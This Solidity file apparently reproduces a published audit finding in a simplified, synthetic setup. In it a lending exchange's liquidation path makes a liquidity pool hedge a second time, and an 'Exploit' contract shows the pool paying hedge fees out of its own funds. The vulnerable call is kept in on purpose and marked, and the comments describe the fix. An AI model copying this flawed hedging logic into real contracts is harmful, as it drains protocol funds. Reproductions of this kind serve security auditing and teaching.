// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Polynomial Protocol — Hedging during liquidation is incorrect
    (Code4rena 2023-03-polynomial, finding #20225, H-02, reporter KIntern_NA)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    When Exchange._liquidate burns debtRepaying powerPerp and reduces the
    short position by the same amount, the LiquidityPool's net skew is already
    balanced. Nevertheless _liquidate still calls pool.liquidate(debtRepaying),
    which hedges AGAIN by that amount. The pool ends up over-hedged and pays
    unnecessary hedge fees out of its funds (LiquidityPool loses funds).

    Harm: after a short liquidation the pool's hedge book increases by
    debtRepaying and usedFunds rises by the hedge fee, even though short
    inventory and powerPerp supply moved in lockstep (no net skew change).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract ShortToken {
    struct ShortPosition {
        address collateral;
        uint256 shortAmount;
        uint256 collateralAmount;
    }

    mapping(uint256 => address) internal _ownerOf;
    mapping(uint256 => ShortPosition) public shortPositions;
    address public exchange;
    uint256 public totalShorts;

    function setExchange(address e) external {
        require(exchange == address(0), "SET");
        exchange = e;
    }

    modifier onlyExchange() {
        require(msg.sender == exchange, "ONLY_EX");
        _;
    }

    function ownerOf(uint256 id) public view returns (address o) {
        require((o = _ownerOf[id]) != address(0), "NOT_MINTED");
    }

    function mintPosition(address trader, uint256 shortAmt, uint256 collAmt) external onlyExchange returns (uint256) {
        uint256 id = 1;
        _ownerOf[id] = trader;
        shortPositions[id] = ShortPosition(address(0xC011), shortAmt, collAmt);
        totalShorts += shortAmt;
        return id;
    }

    function adjustPosition(uint256 positionId, address user, address collateral, uint256 finalPosition, uint256 finalColl)
        external
        onlyExchange
    {
        require(user == ownerOf(positionId));
        ShortPosition storage p = shortPositions[positionId];
        if (finalPosition < p.shortAmount) totalShorts -= (p.shortAmount - finalPosition);
        else totalShorts += (finalPosition - p.shortAmount);
        p.shortAmount = finalPosition;
        p.collateralAmount = finalColl;
        p.collateral = collateral;
        if (finalPosition == 0) delete _ownerOf[positionId];
    }

    function getPosition(uint256 id) external view returns (ShortPosition memory) {
        return shortPositions[id];
    }
}

/// @notice Reduced LiquidityPool — liquidate hedges by `amount` and charges a fee.
contract LiquidityPool {
    address public exchange;
    int256 public hedgePosition; // net hedge in the perp market
    int256 public usedFunds; // fees / PnL booked against the pool
    uint256 public constant HEDGE_FEE = 10e18; // flat fee paid out of pool funds per hedge unit batch
    MockERC20 public immutable feeToken; // pool treasury used to pay hedge fees

    constructor(MockERC20 feeToken_) {
        feeToken = feeToken_;
    }

    function setExchange(address e) external {
        require(exchange == address(0), "SET");
        exchange = e;
    }

    /// @dev Faithful reduction of LiquidityPool.liquidate — always hedges.
    function liquidate(uint256 amount) external {
        require(msg.sender == exchange, "ONLY_EX");
        // (markPrice validity omitted)
        uint256 hedgingFees = _hedge(int256(amount), true);
        // @> VULN: liquidation already reduced short inventory by `amount` and
        // burned the same amount of powerPerp, so pool skew did not change —
        // hedging again over-hedges and burns pool funds as fees.
        // FIX: do not hedge the LiquidityPool during liquidation.
        usedFunds += int256(hedgingFees);
    }

    function _hedge(int256 amount, bool /*isLiquidation*/ ) internal returns (uint256 fees) {
        hedgePosition += amount; // open additional hedge
        fees = HEDGE_FEE;
        // Pay fee out of pool treasury (demonstrates fund loss).
        address feeSink = address(0xFEE);
        feeToken.transfer(feeSink, fees);
    }
}

contract Exchange {
    ShortToken public immutable shortToken;
    LiquidityPool public immutable pool;
    MockERC20 public immutable powerPerp;

    constructor(ShortToken st, LiquidityPool p, MockERC20 pp) {
        shortToken = st;
        pool = p;
        powerPerp = pp;
    }

    function openShort(address trader, uint256 shortAmt, uint256 collAmt) external returns (uint256) {
        return shortToken.mintPosition(trader, shortAmt, collAmt);
    }

    /// @dev Faithful reduction of Exchange._liquidate (hedge call is the bug).
    function _liquidate(uint256 positionId, uint256 debtRepaying) internal {
        ShortToken.ShortPosition memory position = shortToken.getPosition(positionId);

        // Collateral return abstracted — not this finding's focus.
        uint256 totalCollateralReturned = 0;

        address user = shortToken.ownerOf(positionId);

        uint256 finalPosition = position.shortAmount - debtRepaying;
        uint256 finalCollateralAmount = position.collateralAmount - totalCollateralReturned;

        shortToken.adjustPosition(positionId, user, position.collateral, finalPosition, finalCollateralAmount);

        pool.liquidate(debtRepaying);
        powerPerp.burn(msg.sender, debtRepaying);
    }

    function liquidate(uint256 positionId, uint256 debtRepaying) external {
        _liquidate(positionId, debtRepaying);
    }
}

contract Exploit {
    MockERC20 public powerPerp; // CREATE nonce 1
    MockERC20 public feeToken; // CREATE nonce 2
    ShortToken public shortToken; // CREATE nonce 3
    LiquidityPool public pool; // CREATE nonce 4
    Exchange public exchange; // CREATE nonce 5

    uint256 public constant SHORT_AMT = 1000e18;
    uint256 public constant DEBT_REPAYING = 400e18;

    constructor() {
        powerPerp = new MockERC20();
        feeToken = new MockERC20();
        shortToken = new ShortToken();
        pool = new LiquidityPool(feeToken);
        exchange = new Exchange(shortToken, pool, powerPerp);

        shortToken.setExchange(address(exchange));
        pool.setExchange(address(exchange));

        // Pool treasury funds the hedge fee.
        feeToken.mint(address(pool), 1000e18);

        // Open a short; pool is notionally already hedged 1:1 with totalShorts
        // (skew balanced). We record that by not pre-setting hedgePosition.
        exchange.openShort(address(0xA11CE), SHORT_AMT, 2000e18);

        // Liquidator holds powerPerp to burn
        powerPerp.mint(address(this), DEBT_REPAYING);
    }

    function run() external {
        int256 hedgeBefore = pool.hedgePosition();
        int256 fundsBefore = pool.usedFunds();
        uint256 poolFeeBalBefore = feeToken.balanceOf(address(pool));
        uint256 shortsBefore = shortToken.totalShorts();

        // Liquidate part of the short: short inventory drops by DEBT_REPAYING
        // and powerPerp is burned by the same amount → skew unchanged.
        exchange.liquidate(1, DEBT_REPAYING);

        uint256 shortsAfter = shortToken.totalShorts();
        require(shortsBefore - shortsAfter == DEBT_REPAYING, "short not reduced");
        require(powerPerp.balanceOf(address(this)) == 0, "powerPerp not burned");

        // HARM: pool hedged AGAIN by debtRepaying and paid hedge fees.
        require(pool.hedgePosition() == hedgeBefore + int256(DEBT_REPAYING), "over-hedged");
        require(pool.usedFunds() == fundsBefore + int256(pool.HEDGE_FEE()), "fees not booked");
        require(feeToken.balanceOf(address(pool)) == poolFeeBalBefore - pool.HEDGE_FEE(), "pool lost fee funds");
        // Correct behaviour: hedgePosition and usedFunds would be unchanged
        // (short reduction already balanced the book). The delta IS the bug.
    }
}
